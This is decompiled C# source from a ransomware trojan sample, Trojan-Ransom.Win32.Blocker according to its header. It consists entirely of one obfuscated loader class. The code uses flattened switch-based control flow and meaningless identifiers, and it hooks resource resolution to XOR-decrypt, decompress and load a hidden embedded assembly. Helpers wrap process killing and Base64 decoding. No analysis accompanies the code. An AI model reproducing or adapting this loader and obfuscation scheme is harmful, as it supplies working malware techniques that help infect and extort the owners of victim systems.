// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႰႰ
// Assembly: 2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74BDD15D-12B6-4AF6-A414-BF46F9B2B38E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bgnp-2d8181bdd44db6a6cf6e7140f578a36b2a17d8c04a2d26d38e122e42ecc24c28.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading;

namespace Ⴃ
{
  internal sealed class ႰႰ
  {
    private static bool ႷႼ;

    internal static Assembly ႨႷ(object sender, ResolveEventArgs args)
    {
label_3:
      string str1 = ႰႨ.ႰႥ.ႰႭ.Ⴃ(1311828761, 0);
      string name = str1;
      string str2 = ႰႰ.Ⴄ((object) name, (object) '1', 966, 1009);
      int num1 = 2;
      AppDomain appDomain;
      Dictionary<string, string> dictionary;
      Assembly assembly;
      Stream stream;
      byte[] buffer;
      int num2;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 14:
            dictionary = new Dictionary<string, string>();
            ႰႨ.ႰႥ.ႰႭ.Ⴓ(appDomain, str2, (object) dictionary, 496, 394);
            num1 = 13;
            continue;
          case 1:
            num1 = stream != null ? 9 : 12;
            continue;
          case 2:
            appDomain = ႰႨ.Ⴗ(703, 751);
            dictionary = (Dictionary<string, string>) ႰႨ.ႰႥ.ႰႭ.Ⴈ(appDomain, str2, 825, 769);
            num1 = 17;
            continue;
          case 3:
            index1 = 0;
            num1 = 6;
            continue;
          case 4:
            num2 = ႰႨ.ႰႥ.Ⴀ(stream, 976, 927);
            ႰႰ.ႰႣ.Ⴄ(stream, buffer, 0, buffer.Length, 758, 663);
            num1 = 3;
            continue;
          case 5:
            goto label_3;
          case 6:
            num1 = index1 < buffer.Length ? 16 : 15;
            continue;
          case 8:
            ++index1;
            num1 = 6;
            continue;
          case 9:
            buffer = new byte[ႰႨ.Ⴐ(stream, 174, 157) - 1L];
            goto case 10;
          case 10:
            num1 = 4;
            continue;
          case 11:
            num1 = 1;
            continue;
          case 12:
            goto label_11;
          case 13:
            assembly = ႰႨ.ႰႥ.ႰႭ.Ⴄ(678, 640);
            stream = ႰႨ.ႰႥ.ႰႭ.Ⴜ(assembly, str1, 884, 768);
            goto case 11;
          case 15:
            goto label_19;
          case 16:
            buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
            num1 = 8;
            continue;
          case 17:
            if (dictionary == null)
            {
              num1 = 14;
              continue;
            }
            goto label_41;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႨႷ);
            num1 = 5;
            continue;
        }
      }
label_11:
      return (Assembly) null;
label_19:
      MemoryStream memoryStream = new MemoryStream();
      DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
      try
      {
        int num3 = 4;
        byte[] numArray;
        int num4;
        while (true)
        {
          switch (num3)
          {
            case 1:
              ႰႨ.Ⴀ((Stream) memoryStream, numArray, 0, num4, 638, 623);
              goto case 2;
            case 2:
              num3 = (num4 = ႰႰ.ႰႣ.Ⴃ((Stream) deflateStream, numArray, 0, numArray.Length, 784, 840)) > 0 ? 1 : 7;
              continue;
            case 3:
            case 6:
              num3 = 2;
              continue;
            case 7:
              goto label_31;
            default:
              numArray = new byte[1024];
              goto case 3;
          }
        }
      }
      finally
      {
        int num5 = 6;
        while (true)
        {
          switch (num5)
          {
            case 0:
            case 2:
              goto label_29;
            case 1:
            case 4:
              goto label_30;
            default:
              num5 = deflateStream == null ? 4 : 2;
              continue;
          }
        }
label_29:
        deflateStream.Dispose();
label_30:;
      }
label_31:
      int num6 = 7;
label_32:
      Assembly data;
      string[] manifestResourceNames;
      int index2;
      string key;
      while (true)
      {
        switch (num6)
        {
          case 0:
            appDomain.SetData(name, (object) data);
            manifestResourceNames = data.GetManifestResourceNames();
            index2 = 0;
            goto case 11;
          case 2:
            num6 = index2 < manifestResourceNames.Length ? 4 : 10;
            continue;
          case 3:
            goto label_43;
          case 4:
            key = manifestResourceNames[index2];
            goto case 9;
          case 5:
            num6 = 0;
            continue;
          case 6:
            num6 = !dictionary.ContainsKey(args.Name) ? 8 : 3;
            continue;
          case 8:
            goto label_44;
          case 9:
            dictionary[key] = key;
            ++index2;
            num6 = 2;
            continue;
          case 10:
            num6 = 6;
            continue;
          case 11:
            num6 = 2;
            continue;
          case 12:
            goto label_41;
          default:
            data = ႰႰ.Ⴈ(ႰႨ.ႰႥ.ႰႭ.ႠႣ(memoryStream, 212, 203), (byte[]) null, ႰႰ.Ⴗ(assembly, 103, 109), 241, 151);
            goto case 5;
        }
      }
label_43:
      return data;
label_44:
      return (Assembly) null;
label_41:
      data = (Assembly) appDomain.GetData(name);
      num6 = 6;
      goto label_32;
    }

    static ႰႰ() => ႰႰ.ႨႤ();

    internal static string Ⴄ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 55:
          num1 = 2;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 5:
            goto label_8;
          case 1:
            goto label_3;
          case 3:
            num2 = 1;
            continue;
          case 4:
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴄ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.ToString() + obj1;
    }

    internal static Evidence Ⴗ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 10:
          num1 = 3;
          break;
        case 11:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 2:
            goto label_10;
          case 3:
            goto label_9;
          case 5:
          case 6:
            num2 = 0;
            continue;
          case 7:
          case 8:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴗ);
            num2 = 0;
            continue;
        }
      }
label_9:
      return obj0.Evidence;
label_10:
      return obj0.Evidence;
    }

    internal static Assembly Ⴈ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] Evidence obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 102:
          num1 = 1;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
            goto label_8;
          case 2:
          case 6:
            num2 = 5;
            continue;
          case 4:
            num2 = 5;
            continue;
          case 5:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴈ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return Assembly.Load(obj0, obj1, obj2);
    }

    internal static DateTime Ⴀ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 126:
          num1 = 5;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 4:
            goto label_3;
          case 2:
            num2 = 0;
            continue;
          case 5:
          case 6:
            goto label_8;
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴀ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return DateTime.Now;
    }

    internal static void Ⴅ([In] AppDomain obj0, [In] ResolveEventHandler obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            num1 = 1;
            continue;
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 54:
                num2 = 4;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.ResourceResolve += obj1;
    }

    internal static void Ⴓ([In] Process obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_7;
          case 5:
            num1 = 4;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 22:
                num2 = 1;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Kill();
    }

    internal static Assembly Ⴃ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 103:
          num1 = 5;
          break;
        case 104:
          num1 = 7;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_10;
          case 1:
          case 5:
            goto label_9;
          case 2:
            num2 = 6;
            continue;
          case 3:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴃ);
            num2 = 6;
            continue;
        }
      }
label_9:
      return Assembly.GetEntryAssembly();
label_10:
      return Assembly.GetExecutingAssembly();
    }

    internal static Encoding Ⴍ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 63:
          num1 = 3;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 5:
          case 7:
            goto label_8;
          case 6:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴍ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return Encoding.UTF8;
    }

    internal static string Ⴐ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 85:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
          case 5:
            goto label_8;
          case 3:
            num2 = 6;
            continue;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴐ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.Name;
    }

    internal static string Ⴜ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 20:
          num1 = 0;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 5:
          case 6:
            goto label_8;
          case 2:
            num2 = 7;
            continue;
          case 4:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.Ⴜ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.ToLower();
    }

    internal static char[] ႷႤ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 90:
          num1 = 1;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 5:
            num2 = 2;
            continue;
          case 1:
          case 3:
            goto label_8;
          case 2:
            goto label_3;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႤ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.ToCharArray();
    }

    internal static Decimal ႷႷ([In] Decimal obj0, [In] Decimal obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 60:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            num2 = 4;
            continue;
          case 1:
          case 7:
            goto label_8;
          case 2:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႷ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return Decimal.Add(obj0, obj1);
    }

    internal static void ႷႨ([In] int obj0, [In] int obj1)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            num1 = 5;
            continue;
          case 2:
            goto label_7;
          default:
            int num2;
            switch (obj1 ^ obj0)
            {
              case 47:
                num2 = 2;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      ProjectData.ClearProjectError();
    }

    internal static object ႷႠ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 7:
          num1 = 0;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 2:
          case 4:
          case 6:
            num2 = 5;
            continue;
          case 3:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႠ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.GetObject(obj1);
    }

    internal static byte[] ႷႥ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 20:
          num1 = 4;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 5:
            num2 = 0;
            continue;
          case 4:
            goto label_8;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႥ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Convert.FromBase64String(obj0);
    }

    internal static void ႷႳ([In] object obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_7;
          case 1:
          case 4:
            num1 = 2;
            continue;
          case 5:
            goto label_8;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 79:
                num2 = 3;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Monitor.Exit(obj0);
    }

    internal static string ႷႣ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 30:
          num1 = 2;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 3:
          case 6:
            goto label_8;
          case 5:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႣ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return Environment.SystemDirectory;
    }

    internal static bool ႷႭ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 105:
          num1 = 4;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_8;
          case 1:
          case 6:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႭ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.Contains(obj1);
    }

    internal static Process ႷႰ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 122:
          num1 = 2;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 7:
            goto label_3;
          case 1:
          case 2:
            goto label_8;
          case 3:
            num2 = 7;
            continue;
          case 5:
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႷႰ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Process.GetProcessById(obj0);
    }

    internal static void ႨႤ()
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_4;
          default:
            if (!ႰႰ.ႷႼ)
            {
              num1 = 1;
              continue;
            }
            goto label_11;
        }
      }
label_11:
      return;
label_4:
      lock (typeof (ႰႰ))
      {
        int num2 = 2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              ႰႰ.ႷႼ = true;
              goto case 4;
            case 1:
              num2 = 5;
              continue;
            case 3:
            case 5:
              goto label_13;
            case 4:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(ႰႰ.ႨႷ);
              goto case 1;
            default:
              num2 = ႰႰ.ႷႼ ? 5 : 0;
              continue;
          }
        }
      }
label_13:
      int num3 = 4;
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_17;
          case 2:
          case 3:
          case 5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႨႤ);
            num3 = 0;
            continue;
          default:
            num3 = 0;
            continue;
        }
      }
label_17:;
    }

    internal sealed class ႰႣ
    {
      internal static int Ⴄ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 97:
            num1 = 4;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              goto label_3;
            case 2:
            case 4:
              goto label_8;
            case 3:
            case 6:
            case 7:
              num2 = 1;
              continue;
            case 5:
              num2 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴄ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return obj0.Read(obj1, obj2, obj3);
      }

      internal static int Ⴃ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 88:
            num1 = 3;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              num2 = 2;
              continue;
            case 1:
            case 7:
              num2 = 2;
              continue;
            case 2:
              goto label_3;
            case 3:
            case 4:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴃ);
              num2 = 2;
              continue;
          }
        }
label_8:
        return obj0.Read(obj1, obj2, obj3);
      }

      internal static MethodInfo Ⴗ([In] Assembly obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 81:
            num1 = 6;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              num2 = 3;
              continue;
            case 1:
            case 6:
            case 7:
              goto label_8;
            case 2:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴗ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0.EntryPoint;
      }

      internal static string Ⴐ([In] char obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 98:
            num1 = 2;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 4:
              num2 = 3;
              continue;
            case 2:
            case 7:
              goto label_8;
            case 3:
              goto label_3;
            case 5:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴐ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Conversions.ToString(obj0);
      }

      internal static void Ⴍ([In] Thread obj0, [In] object obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 4:
            case 5:
              goto label_7;
            case 3:
              num1 = 1;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 54:
                  num2 = 5;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Start(obj1);
      }

      internal static string Ⴀ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 45:
            num1 = 0;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_8;
            case 2:
              num2 = 7;
              continue;
            case 3:
            case 5:
              num2 = 7;
              continue;
            case 4:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴀ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.ToString() + obj1;
      }

      internal static string[] Ⴓ([In] Assembly obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 40:
            num1 = 2;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 2:
              goto label_8;
            case 4:
              num2 = 6;
              continue;
            case 5:
              num2 = 6;
              continue;
            case 6:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴓ);
              num2 = 6;
              continue;
          }
        }
label_8:
        return obj0.GetManifestResourceNames();
      }

      internal static char Ⴈ([In] int obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 60:
            num1 = 2;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 2:
              goto label_8;
            case 3:
            case 4:
            case 6:
              num2 = 0;
              continue;
            case 7:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႰ.ႰႣ.Ⴈ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return Convert.ToChar(obj0);
      }
    }
  }
}
